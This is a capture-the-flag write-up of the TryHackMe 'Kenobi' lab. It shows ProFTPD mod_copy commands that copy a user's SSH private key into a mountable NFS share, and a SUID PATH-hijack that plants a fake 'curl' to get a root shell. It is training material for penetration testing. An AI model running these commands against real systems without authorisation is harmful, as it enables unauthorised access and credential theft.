# Kenobi

TryHackMe Live Room

## Info

**Title**  
Kenobi  

**Created By**  
[TryHackMe](https://tryhackme.com/p/tryhackme)

**Link**  
[here](https://tryhackme.com/room/kenobi)

***NOTE***  
I've used this room as a challenge... My solution might be different from TryHackMe's.


## Scanning
An advanced Nessus scan found two critical vulnerabilities.
1. `ProFTPD mod_copy Information Disclosure`. An unauthenticated client can run the `SITE CPFR` and the `SITE CPTO` commands to change files' location.
2. `NFS Exported Share Information Disclosure`. The directory `var` could be mounted.

Putting the vulnerabilities together, I was able to copy the `id_rsa` key from `.ssh` to `/var`. 

```
nc <ip> 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

`showmounts -e <host>` confirmed that the `/var` directory can be indeed mounted. I executed `sudo mount -t nfs <host>:/var var_host
`, and used the key to authenticate.


## Privilege Escalation
[TryHackMe](https://tryhackme.com/p/tryhackme) has the credit for this solution, as I missed it. The idea was to find a binary suid file, that executes another binary file as root. The `/usr/bin/menu` file matched the requirements. TryHackMe executed the `strings` command and confirmed that `menu` executes `curl` as root. We can exploit this issue by creating a `curl` file which executes the shell. Adding its path to the head of the `PATH` variable, we can execute it as root, by running `/bin/usr/menu` as kenobi. 

`find / -perm -u=s -type f 2>/dev/null` To find `SUID` files under the system.  
`Strings /usr/bin/menu` to find readable strings.

We now create a clone of the `curl` files, which executes the shell as root.
```
echo /bin/sh > /tmp/curl
chmod 777 curl
export PATH=/tmp:$PATH
```
`/usr/bin/menu` to execute the `curl` clone as root, and open the shell.



## Credits
Ori David  
[TryHackMe](https://tryhackme.com/p/tryhackme) 

## Contact
orid2004@gmail.com

